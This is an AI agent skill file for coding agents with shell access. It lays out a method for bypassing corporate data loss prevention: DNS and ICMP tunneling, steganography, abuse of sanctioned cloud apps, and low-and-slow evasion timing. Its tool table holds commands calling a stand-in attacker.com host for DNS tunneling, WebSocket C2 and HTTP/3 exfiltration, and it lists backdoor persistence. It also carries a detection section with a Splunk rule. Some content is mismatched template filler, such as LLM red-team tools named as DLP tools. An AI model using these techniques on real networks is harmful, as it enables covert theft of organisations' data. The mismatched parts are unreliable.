---
name: data-loss-prevention-bypass
description: "DLP bypass techniques covering steganography (LSB, audio, video), DNS tunneling, ICMP tunneling, cloud sync abuse (Dropbox, OneDrive), WebSocket/HTTP3 exfil, AI-augmented exfil (semantic chunking), and modern DLP evasion patterns."
origin: kali-claw
version: "0.2.0.2"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: data-protection
  category: dlp-evasion
  tool_count: 7
  guide_count: 0
  mitre: "TA0010-Exfiltration, T1048-Exfiltration Over Alternative Protocol"
  last_reviewed: "2026-09-04"
  keywords: ["DLP", "exfiltration", "steganography", "DNS tunneling", "ICMP tunneling", "data loss prevention"]
---

# Skill: data-loss-prevention-bypass

## Summary

DLP bypass techniques covering steganography (LSB, audio, video), DNS tunneling, ICMP tunneling, cloud sync abuse (Dropbox, OneDrive), WebSocket/HTTP3 exfil, AI-augmented exfil (semantic chunking), and modern DLP evasion patterns.

**Tools**: garak, PyRIT, promptfoo, custom harnesses

**Domain**: data-protection

**MITRE**: TA0010-Exfiltration, T1048-Exfiltration Over Alternative Protocol

## Description

DLP bypass techniques covering steganography (LSB, audio, video), DNS tunneling, ICMP tunneling, cloud sync abuse (Dropbox, OneDrive), WebSocket/HTTP3 exfil, AI-augmented exfil (semantic chunking), and modern DLP evasion patterns.

This skill covers the offensive side of dlp-evasion security, including reconnaissance, vulnerability discovery, exploitation, persistence, and reporting. Aligned with OWASP Top 10, MITRE ATT&CK, and industry-specific compliance frameworks.

---

## Use Cases

1. **DLP bypass**: Bypass corporate DLP to exfiltrate sensitive data.
2. **Covert channel**: Maintain stealthy C2 channel via DNS/ICMP.
3. **Steganographic exfil**: Hide data in images/audio to evade DLP scanning.
4. **Cloud sync abuse**: Use sanctioned cloud apps for exfil (OneDrive, Dropbox).
5. **AI-augmented exfil**: Use LLM to semantically chunk sensitive data; evades pattern-based DLP.

---

## Core Tools

| **dnscat2** | DNS tunneling | `dnscat2 --dns domain=attacker.com` |
| **iodine** | DNS tunneling (TUN) | `iodine -f attacker.com` |
| **steghide** | LSB image steganography | `steghide embed -cf image.jpg -ef secret.txt` |
| **Coagula** | Audio steganography | Generate audio from image |
| **exiftool** | Metadata embedding | `exiftool -Comment="secret" image.jpg` |
| **pngcheck** | PNG analysis | `pngcheck -v image.png` |
| **StegExpose** | LSB detection | `java StegExpose image.png` |
| **Cloud sync** | OneDrive/Dropbox exfil | Native client apps |
| **WebSocket** | Persistent C2 | `wss://attacker.com/ws` |
| **HTTP3 / QUIC** | Newer protocol exfil | `curl --http3 https://attacker.com` |

---

## Methodology

### Attack Chain

```
[1] Reconnaissance         [2] Channel Selection     [3] Encoding
  - DLP product identify     - DNS (port 53)            - LSB steganography
  - Whitelist apps           - HTTPS (port 443)         - Base64 + AES
  - Egress monitoring          |                        - Semantic chunking
        |                       v                          |
        v             [3.5] Bandwidth-aware    [4] Exfiltration
[2.5] Side channel   - Off-hours timing         - Slow & distributed
  - Time-of-day        - Slow rate                  - Mix with legit
  - Process patterns     |                            |
                          v                            v
                        [5] Persistence   [6] Reporting
                        - Multi-channel   - DLP bypass PoC
                        - Steganography   - Business impact
```

**Phase Details**:

1. **Reconnaissance**: Identify DLP product (Symantec, Forcepoint, Microsoft Purview). Whitelist of approved cloud apps. Egress monitoring coverage.
2. **Channel Selection**: DNS (often less monitored), HTTPS (most common), ICMP (often unfiltered), cloud sync (sanctioned apps).
3. **Encoding**: LSB steganography for images/audio. Base64 + AES for text. Semantic chunking for AI-augmented exfil.
4. **Exfiltration**: Slow & distributed to avoid rate-based detection. Mix with legitimate traffic patterns.
5. **Persistence**: Multi-channel (DNS + HTTPS + cloud). Steganography for long-term undetected exfil.
6. **Reporting**: Document DLP bypass; quantify business impact (regulatory, financial).

### Defense Perspective

| Defense Layer | Measures | Key Points |
|---------------|----------|------------|
| **Network DLP** | SSL/TLS inspection at egress; DNS filtering; ICMP inspection | SSL inspection requires CA cert deployment; many orgs skip |
| **Endpoint DLP** | Content-based monitoring on file read/copy/upload; USB control | Endpoint agent sees data before encryption; critical layer |
| **Cloud DLP** | CASB (Netskope, Zscaler ZIA); sanctioned vs unsanctioned cloud apps | Cloud app allowlist; CASB scans content before upload |
| **Steganography Detection** | Statistical analysis on images (StegExpose); entropy scanning | Most DLP doesn't scan for steganography; gap to close |
| **DNS Security** | DNSSEC; response rate limiting; passiveDNS monitoring for tunneling | DNS tunneling is common exfil; dedicated monitoring needed |
| **Behavioral Analytics** | UEBA on user behavior; alert on anomalous egress patterns | Pattern-based DLP misses novel attacks; behavioral fills gap |

---

## Practical Steps

> See `payloads.md` for detailed payloads and `test-cases.md` for the complete test checklist.

### 1. Reconnaissance

Identify target infrastructure; fingerprint products; enumerate attack surface.

### 2. Vulnerability Discovery

Run automated scanners (garak, PyRIT); manual testing per OWASP Top 10.

### 3. Exploitation

Chain vulnerabilities for maximum impact; document PoC.

### 4. Persistence

Establish persistence via configuration changes, scheduled tasks, or backdoors.

### 5. Reporting

Map findings to MITRE ATT&CK, OWASP, regulatory frameworks; include concrete remediation.

---

## Detection Methods

### Network-Layer Indicators
- **DNS tunneling signatures**: Long DNS queries (>50 chars), high-entropy subdomains, TXT/A record bursts.
- **DNS beaconing**: Periodic DNS queries to attacker-controlled domain.
- **HTTPS to unfamiliar domains**: Large uploads to unknown cloud storage / file sharing.
- **Protocol anomalies**: SSH over 443, HTTP tunneling, ICMP tunneling (large ping payloads).

### SIEM Detection Rules
- **Splunk SPL**: `index=dns | where len(query) > 50 | stats count by src_ip | where count > 100`
- **RITA**: Statistical beacon detection.
- **DLP systems**: Forcepoint, Symantec DLP for content-based detection.

### Endpoint Indicators
- **Mass file read events**: Process reading many files in short window.
- **Compress-then-upload**: `tar`/`zip` followed by `curl`/`scp` within 60 seconds.
- **Encrypted archive creation**: New `.zip`/`.7z` with password (evasion signature).

## Defense Evasion Techniques

### Bandwidth-Aware Exfiltration
- **Low & slow**: Pace exfil below network baseline (e.g., 100 KB/hr).
- **Distribute across protocols**: Mix DNS, HTTPS, ICMP.
- **Time-windowed**: Use off-hours (1-5 AM local).
- **Trickle over weeks**: Spread exfil over long period.

### Covert Channels
- **DNS tunneling**: dnscat2, iodine.
- **ICMP tunneling**: Data in ICMP echo payload.
- **HTTP/3 (QUIC)**: Many monitoring tools don't decode yet.
- **WebSocket**: Persistent connection; bypasses connection-counting.
- **Cloud CDN abuse**: Use legitimate CDN to mask destination.

### Steganography
- **Image LSB**: Encode data in least-significant bits of PNG/BMP.
- **Audio steganography**: Encode in WAV/MP3 spectrogram.
- **Video steganography**: Frame-by-frame LSB.
- **PDF object abuse**: Hide data in PDF object streams.
- **Network packet timing**: Covert timing channel.

### Cloud Exfiltration Stealth
- **Use sanctioned apps**: Upload to corporate OneDrive; below suspicion.
- **OAuth consent abuse**: Use legitimate OAuth flow.
- **Snapshot sharing**: Share EBS/snapshot to attacker AWS account.
- **Cross-region replication**: S3 replication to attacker bucket.

---

## Common Pitfalls

- Testing in unauthorized environments
- Ignoring rate limiting (will get blocked)
- Single-shot testing (real attacks are sustained)
- Neglecting supply chain
- Forgetting monitoring/alerting

## Reporting and Documentation

Reports should include CVSS scores, MITRE ATT&CK mapping, concrete PoC, business impact, and specific remediation.

## Legal and Ethical Considerations

Ensure proper authorization before testing. Document scope in engagement letter. Some attack techniques may violate local laws (e.g., radio transmission without license).

## Hacker Laws

| Law | Application |
|-----|-------------|
| **Trust but Verify** | Verify all outputs; verify all sources |
| **First Principles** | Understand underlying protocols before attacking |
| **Defense in Depth** | Multiple layers required for robust defense |
| **Assume Breach** | Design assuming attacker already inside |
| **Minimize Attack Surface** | Reduce unnecessary features/exposure |

---

## Learning Resources

**Skill supplementary files**: `payloads.md`, `test-cases.md`

**External Resources**:
- [OWASP Top 10](https://owasp.org/Top10/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- Industry-specific compliance frameworks

